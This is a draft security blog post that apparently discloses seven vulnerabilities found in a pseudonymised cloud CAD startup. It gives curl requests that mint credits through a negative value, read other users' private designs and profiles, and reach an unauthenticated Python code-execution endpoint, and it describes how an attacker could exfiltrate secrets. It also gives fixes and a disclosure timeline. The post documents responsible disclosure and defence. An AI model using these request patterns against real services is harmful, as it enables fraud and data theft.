---
title: 'Researching foreign cloud-native CAD software'
excerpt: 'A summary of vulnerabilities I found in a cloud-native CAD application and recommendations to fix them.'
coverImage: '/kittycad-blog-banner.png'
date: '2026-05-05T13:00:00.000Z'
author:
    name: Max Ammann
    picture: '/documentation-assets/maxammann.jpeg'
ogImage:
        url: '/documentation-assets/meta-images/researching-foreign-cloud-native-CAD-software-blog.png'
tags: ['New', 'Security']
draft: true
---


## Researching cloud-native CAD vulnerabilities in foreign software

A while ago I was doing some security researching a cloud-native CAD application. It shares some features with Zoo, like a prompt that allows you to generate CAD designs from text.
They are a small startup so we agreed on using a pseudonym for them and not disclosing their name. Let's name them OrbitSketch.

We were able to exploit several vulnerabilities ranging from missing their service to actually gaining remote-code-execution on their STEP file exporter.

This blog post goes through the vulnerabilities and summarizes learnings. Looking at other software, and performing security research on it,
is a great way to find become more creative when looking for security problems in Zoo's systems.

## ORBIT-1: Minting credits out of thin air

| Severity | Difficulty |
|----------|------------|
| High     | Low        |

Credit deduction is handled on the client side. Attackers can deduct positive or negative credit values, effectively removing or adding credits to their account.

### Exploit Scenario

An attacker sends the following request to mint credits.
The "money" parameter is set to -1, effectively adding one credit to the user's account instead of deducting it.

```bash
curl 'https://someapp.supabase.co/rest/v1/rpc/cash_up' \
    -H "apikey: $API_KEY" \
    -H "authorization: Bearer $BEARER" \
    --data-raw '{"user":"c24acd26-07e4-433c-909c-babb9becbeb8","money":-1,"cad":"851126cb-760d-4e5f-9077-7c11e019edb6"}'
```

### Recommendations

Short term, disallow negative values for the "money" parameter.

Long term, move logic to deduct credits to the server side entirely, so that the client cannot manipulate it.

## ORBIT-3: Disclosure of private designs

| Severity | Difficulty |
|----------|------------|
| High     | Low        |

```bash
curl 'https://someapp.supabase.co/rest/v1/cad?select=*&visibility=eq.private' \
    -H "apikey: $API_KEY" \
    -H "authorization: Bearer $BEARER"
```

Returns full cad designs not created by the logged in user (the logged in user's id is `c24acd26-07e4-433c-909c-babb9becbeb8`).

```json
[
  ...
  {
    "id": "aa03997a-7ef7-4f1d-9df6-334d0ae8f7c1",
    "created_at": "<redacted>",
    "updated_at": "<redacted>",
    "user": "<redacted>",
    "title": "<redacted>",
    "description": "<redacted>",
    "visibility": "private",
    ...
  },
  ...
]
```

### Exploit Scenario

An attacker authenticates as any valid user and queries designs with `visibility=private` using `select=*`.
The response includes private designs belonging to other users, including scad_code and metadata.

### Recommendations

Short term, enable Row Level Security (RLS) on the designs table. Configure policies so that private designs are only accessible for owners. Public designs should allow select operations where visibility equals 'public'.
Avoid exposing all table fields; instead create a view (e.g., public_designs) that exposes only non-sensitive fields and excludes scad_code for non-owners.

Long term, route all design access through a backend service using the Supabase service key.
Enforce ownership checks server-side, add auditing capabilities, and add tests that prevent reading private rows across users.

## ORBIT-2: Disclosure of user profiles

| Severity | Difficulty |
|----------|------------|
| High     | Low        |

The users table is readable by any authenticated user.
A broad `select=* returns all profile rows and sensitive fields like the full name of the user, enabling user enumeration and privacy violations.

```bash
curl 'https://someapp.supabase.co/rest/v1/users?select=*' \
    -H "apikey: $API_KEY" \
    -H "authorization: Bearer $BEARER"
```

### Exploit Scenario

An attacker authenticates once and lists all profiles via `select=*.
This data can be scraped to identify users and fetch their public designs.

### Recommendations

Short term, disallow fetching other users' profiles by enabling Row Level Security (RLS) on the profiles table. This feature seems not required.

## ORBIT-4: Raw error stack traces are returned

| Severity | Difficulty |
|----------|------------|
| Low      | Low        |

### Description

The STEP exporter returns full stack traces and internal error details for malformed inputs.
This might leak implementation details (file paths, package versions, framework internals) and can aid targeted exploitation.

The following query returns `Translation failed: BRepPrimAPI_MakeRevol failed`.
```bash
curl 'https://step-service-abc.app/export/step' \
    --data-raw '<some json data>'
```

### Exploit Scenario

An attacker sends malformed or oversized CSG payloads to the exporter.
The service responds with verbose 5xx responses containing stack traces that reveal internal paths and libraries, which can inform targeted probes.

### Recommendations

Short term, standardize error handling and return sanitized error messages without stack traces or internal details.

## ORBIT-5: Frontend source code is not minified

| Severity | Difficulty |
|----------|------------|
| Low      | Low        |

The production frontend serves readable, non-minified JavaScript (and/or exposes source maps). This eases reverse engineering of client logic, endpoints, and endpoints.

### Exploit Scenario

An attacker downloads the bundle, reviews human-readable code and comments, extracts internal URLs/keys, and replicates client-side enforcement.

### Recommendations

Short term, enable production builds with minification enabled. Disable public source maps in production deployments.

Long term, treat the client as untrusted by moving all sensitive logic server-side. Avoid embedding secrets in client code and implement server-enforced authorization and rate limits.

## ORBIT-6: Step generator is unauthenticated

| Severity | Difficulty |
|----------|------------|
| Medium   | Low        |

The Cloud Run STEP export endpoint accepts requests without authentication. Anyone can trigger CPU-heavy conversions, risking abuse, cost amplification, and potential DoS.

```
curl 'https://step-service-abc.app/export/step' \
--data-raw '<some json data>'
```

### Exploit Scenario

An attacker invokes the endpoint without credentials in a tight loop from multiple clients. This consumes CPU and memory resources, drives up operational costs, and degrades availability for legitimate users.

### Recommendations

Short term, require authentication and apply abuse controls.
Long term, place the exporter behind an authenticated backend service that checks user credits and quotas before processing. Process jobs via a queue with per-user limits. Add billing safeguards and monitoring dashboards to track usage patterns.



## ORBIT-7: Arbitrary remote code execution in STEP exporter

I found a very serious one though. It is possible to execute arbitrary code on https://step-service-abc.app/build123d/execute
As the code is just python you can read from the filesystem, including secrets and environment variables.

I recommend disabling this endpoint until the execution of it is properly sandboxed. I suspect handling this might be hard to fix immediately. This specific finding is not under the embargo until March, but I'd suggest to start a fresh embargo period so this finding will remain under embargo until Monday, 4 May 2026

```bash
curl 'https://step-service-abc.app/build123d/execute' \
  --data-raw $'{"build123d_code":"from build123d import *\\n\\n# Mug dimensions\\nheight = 100.0\\nouter_radius = ... ","output_format":"stl"}'
```

### Exploit Scenario

An attacker invokes the `execute` endpoint with a malicious Python payload that collects sensitive information and sends it out to an attacker-controlled server.
For example, the payload could read environment variables, secrets on the file system, and exfiltrate data via an HTTP request.

### Recommendations

Short term, validate the payload to disallow operations that could lead to arbitrary code execution. Block statements like `import os` or `eval()`.
Note that this short-term mitigation likely won't be sufficient and only deters unsophisticated attackers.

Long-term, implement proper sandboxing for code execution. Use virtual machines and restrict network access and other system calls.

## Conclusion

OrbitSketch was very responsive and responsible in handling the vulnerabilities. They fixed all of them within a few weeks and were very transparent about the process, as you can see in the timeline below.
Especially the last vulnerability was quite serious, and it shows how careful you have to be when implementing features at a fast pace. Sandboxing is not optional, and it can be quite difficult to achieve.

This sparked some ideas on how we can sandbox and separate things even more at Zoo. We are already doing quite extensive sandboxing with our engines, using one K8S node per engine.
However, there is always more sandboxing you can do. Just recently, we implemented sandboxing using Landlock. This allows us to restrict what a process can do during runtime.
Our backend and engine processes drop their privileges after bootstrapping.
After that, they can no longer read from certain file system paths, for example. This is a great mitigation against path traversal vulnerabilities.

## Disclosure Timeline

- 18th December 2025: ORBIT-1 through ORBIT-6 were disclosed to OrbitSketch. OrbitSketch acknowledged the vulnerabilities and started working on fixes.
- 5th January 2026: OrbitSketch confirmed that they were fixed.
- 31st January 2026: We validated the fixes for ORBIT-1 through and ORBIT-6. All known issues were fixed except for ORBIT-6.
- 3rd February 2026: ORBIT-6 was fixed. ORBIT-7 was disclosed and mitigated on the same day.
